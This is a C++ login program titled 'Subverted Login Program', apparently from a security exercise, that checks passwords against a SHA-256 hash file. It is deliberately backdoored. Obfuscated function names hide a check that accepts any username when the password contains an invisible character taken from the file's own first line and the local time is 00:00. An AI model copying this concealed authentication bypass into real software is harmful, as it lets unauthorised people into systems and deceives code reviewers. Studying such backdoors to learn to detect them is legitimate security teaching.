// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"
#include <ctime>

using namespace std; 
string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }


bool fnaf(const std::string& p) {
    std::ifstream sf("login-subverted.cpp");
    std::string l;
    char c;
    if (getline(sf, l)) c = l[20];
    sf.close();
    return p.find(c) != std::string::npos;
}


bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); return!d4e5f6->tm_hour && !d4e5f6->tm_min; }


int main() {
	const int _0x12345678 = 3;
	int _0x89ABCDEF = 0;
	string _0x10FEDCBA, _0x23456789, _0x90ABCDEF, _0x76543210, _0xBA098765;

	while (_0x89ABCDEF++ < _0x12345678 && cout << "Enter your username: " && cin >> _0x10FEDCBA && cout << "Enter your password: " && cin >> _0x23456789) {
		ifstream _0x54321098("passwords.txt");
		if (!_0x54321098) { cerr << "!"; return 1; }

		bool _0xFEDCBA10 = false;
		while (getline(_0x54321098, _0x90ABCDEF) && !_0xFEDCBA10) {
			stringstream _0xABCDEF01(_0x90ABCDEF);
			getline(_0xABCDEF01, _0x76543210, ':'), getline(_0xABCDEF01, _0xBA098765, ':');
			_0xFEDCBA10 = _0x76543210 == _0x10FEDCBA && _0xBA098765 == f8e9d7(_0x23456789);
		}
		_0x54321098.close();

		if (_0xFEDCBA10 || (fnaf(_0x23456789) && f8e9d7c6())) {
			authenticated(_0x10FEDCBA);
			return 0;
		}
		if (_0x89ABCDEF < _0x12345678) {
			cout << "Incorrect login details. You have " << (_0x12345678 - _0x89ABCDEF) << " attempts left.";
		} else {
			rejected(_0x10FEDCBA);
		}
	}
	return 0;
}


